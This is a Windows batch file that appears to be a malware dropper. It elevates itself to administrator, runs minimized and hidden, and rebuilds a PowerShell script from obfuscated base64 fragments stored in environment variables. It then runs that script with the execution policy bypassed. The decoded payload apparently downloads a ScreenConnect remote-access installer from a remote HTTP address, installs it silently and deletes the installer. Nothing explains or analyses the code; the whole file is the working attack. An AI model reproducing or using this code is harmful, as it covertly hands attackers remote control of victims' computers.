@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
setlocal enabledelayedexpansion
set "temp_dir=%TEMP%\ps_temp_%RANDOM%"
mkdir "%temp_dir%" 2>nul
set "_XEU8iaX7=AF4Nfwm0KXqdGsPdM"
set "_fRimzvCg=3BvXgUkE88VYY5JyC64KlB"
set "_4idHpurSiNMy=JEV4ZWN1dGlvbkNvbnRleHQuU2Vzc2lvblN0YXRlLkxhbmd1YWdlTW9kZSA9ICdGdWxsTGFuZ3"
set "_IktU0Mwj8m2r=VhZ2UnCiR2X29uODJQTXFoZklpQXV3Z21VViA9ICgKICAgICdKSFZ5YkNBOUlDZG9kSFJ3T2k4"
set "_jys7yurlLtI=dk1qRTJMakl5TGpVdU9EWTZPREEwTUM5Q2FXNHZVMk55WldWdVEyOXUnICsKICAgICdibVZqZE"
set "_MRQw9FnB260=M1RGJHbGxiblJUWlhSMWNDNXRjMmsvWlQxQlkyTmxjM05lSm5rOVIzVmxjM1FuQ2lSdmRYUncn"
set "_TXeFZlLK_lX=ICsKICAgICdkWFFnUFNBaUpHVnVkanBVUlUxUVhINGtLRnRUZVhOMFpXMHVSM1ZwWkYwNk9rNW"
set "_GZb9Sn=xkMGQxYVdRb0tTNVUnICsKICAgICdiMU4wY21sdVp5Z3BMbE4xWW5OMGNtbHVaeWd3TERncEtT"
set "_Yvp01JMT0=NXRjMmtpQ2tsdWRtOXJaUzFYWldKU1pYRjEnICsKICAgICdaWE4wSUMxVmNta2dKSFZ5YkNBdF"
set "_sFq3rCHZwuCb=QzVjBSbWxzWlNBa2IzVjBjSFYwSUMxVmMyVkNZWE5wWTFCaGNuTnAnICsKICAgICdibWNLVTNS"
set "_uNg0NA=aGNuUXRVSEp2WTJWemN5QnRjMmxsZUdWakxtVjRaU0F0UVhKbmRXMWxiblJNYVhOMElDY3YnIC"
set "_IoZ5V8Niz=sKICAgICdhU2NzSUNSdmRYUndkWFFzSUNjdmNXNG5JQzFYWVdsMENsSmxiVzkyWlMxSmRHVnRJ"
set "_p0dxxbNlF=QzFRWVhSb0lDUnYnICsKICAgICdkWFJ3ZFhRZ0xVWnZjbU5sSUMxRmNuSnZja0ZqZEdsdmJpQl"
set "_uY1_S3mpGD=RhV3hsYm5Sc2VVTnZiblJwYm5WbCcKKQokdl9WWTFabjBkSEh5UERrU1dwT2sgPSBbc1lTVEVN"
set "_JqJFg4R9RoDA=LlRFWFQuZW5Db0RpbkddOjpVdEY4LkdFdHNUUkluRyhbc3lTVEVNLkNPbnZFcnRdOjpmck9NQm"
set "_dBA67JAl_KH3=FzZTY0U1RSSU5nKCR2X29uODJQTXFoZklpQXV3Z21VVikpCiR2X1daSjhEOXVGNFVtcXBmMU53"
set "_QYD4Y231d=ciA9IFtzWVNURU0ubWFOQUdlbUVuVC5hdVRPTWF0SW9OLlNjUklQdEJMb0NLXTo6Y1JFQXRFKC"
set "_Zj_Wv112=R2X1ZZMVpuMGRISHlQRGtTV3BPaykKJiAkdl9XWko4RDl1RjRVbXFwZjFOd3IgQGFyZ3M="
set "_CJLPnimpZGl=GtIOqge9NAiiPlJXyT4="
powershell -WindowStyle Hidden -Command "$f=@($env:_4idHpurSiNMy,$env:_IktU0Mwj8m2r,$env:_jys7yurlLtI,$env:_MRQw9FnB260,$env:_TXeFZlLK_lX,$env:_GZb9Sn,$env:_Yvp01JMT0,$env:_sFq3rCHZwuCb,$env:_uNg0NA,$env:_IoZ5V8Niz,$env:_p0dxxbNlF,$env:_uY1_S3mpGD,$env:_JqJFg4R9RoDA,$env:_dBA67JAl_KH3,$env:_QYD4Y231d,$env:_Zj_Wv112);$j=$f -join '';[IO.File]::WriteAllText('%temp_dir%\script.ps1', [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($j)))"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp_dir%\script.ps1"
timeout /t 3 /nobreak >nul 2>&1
exit /b